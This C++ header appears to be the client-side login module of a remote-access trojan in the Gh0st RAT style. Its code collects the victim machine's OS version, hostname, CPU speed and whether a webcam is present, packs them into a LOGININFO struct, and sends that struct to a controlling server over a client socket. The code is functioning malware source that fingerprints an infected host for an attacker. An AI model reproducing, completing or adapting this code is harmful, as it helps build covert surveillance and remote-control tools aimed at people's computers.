#pragma once
#include <wininet.h>
#include <vfw.h>

#include "until.h"

//#pragma warning(disable: 4800)

typedef struct lxLOGININFO
{
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息
	int				CPUClockMhz;	// CPU主频
	IN_ADDR			IPAddress;		// 存储32位的IPv4的地址数据结构
	TCHAR			HostName[50];	// 主机名
	TCHAR			HostReMark[50];	// 备注
	bool			bIsWebCam;		// 是否有摄像头
	DWORD			dwSpeed;		// 网速
}LOGININFO;

// Get System Information
DWORD CPUClockMhz()
{
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;

	RegOpenKey(HKEY_LOCAL_MACHINE, _T("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"), &hKey);
	RegQueryValueEx(hKey, _T("~MHz"), NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);

	RegCloseKey(hKey);

	return	dwCPUMhz;
}

inline bool IsWebCam()
{
	bool bRet = false;
	HINSTANCE avicap32 = LoadLibraryW(L"avicap32.dll");
	typedef bool (WINAPI *GETDRIVER)(UINT, LPTSTR, INT, LPTSTR, INT);
#ifdef _UNICODE
	GETDRIVER mycapGetDriverDescription = (GETDRIVER)GetProcAddress(avicap32, "capGetDriverDescriptionW");
#else
	GETDRIVER mycapGetDriverDescription = (GETDRIVER)GetProcAddress(avicap32, "capGetDriverDescriptionA");
#endif

	TCHAR lpszName[100], lpszVer[50];
	for (int i = 0; i < 10 && !bRet; i++)
	{
		bRet = mycapGetDriverDescription(i, lpszName, sizeof(lpszName), lpszVer, sizeof(lpszVer));
	}
	if (avicap32)
		FreeLibrary(avicap32);
	return bRet;
}

BOOL RtlGetVersionEx(LPOSVERSIONINFOW lpVersionInformation)
{
	typedef DWORD NTSTATUS;

	typedef NTSTATUS (NTAPI* TRtlGetVersion)(PRTL_OSVERSIONINFOW);
	TRtlGetVersion lpRtlGetVersion = (TRtlGetVersion)GetProcAddress(GetModuleHandleW(L"NTDLL"), "RtlGetVersion");

	if (lpRtlGetVersion)
	{
		return lpRtlGetVersion((PRTL_OSVERSIONINFOW)lpVersionInformation) >= 0;
	}

	return false;
}

int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed)
{
	LOGININFO LoginInfo;

	LoginInfo.bToken = TOKEN_LOGIN;

	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	RtlGetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx);

	TCHAR hostname[128] = _T("");

#ifdef UNICODE
	char hostn[128] = "";
	gethostname(hostn, 128);
	int nwlen = MultiByteToWideChar(CP_ACP, 0, hostn, lstrlenA(hostn), NULL, 0);
	MultiByteToWideChar(CP_ACP, 0, hostn, lstrlenA(hostn), hostname, nwlen);
#else
	gethostname(hostname, 128);
#endif

	// 连接的IP地址
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	//mygetsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, sizeof(sockAddr));

	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	lstrcpy(LoginInfo.HostName, hostname);
	lstrcpy(LoginInfo.HostReMark, _T("lx"));  //remark
	// CPU
	LoginInfo.CPUClockMhz = CPUClockMhz();
	LoginInfo.bIsWebCam = IsWebCam();

	// Speed
	LoginInfo.dwSpeed = dwSpeed;

	int nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));

	return nRet;
}
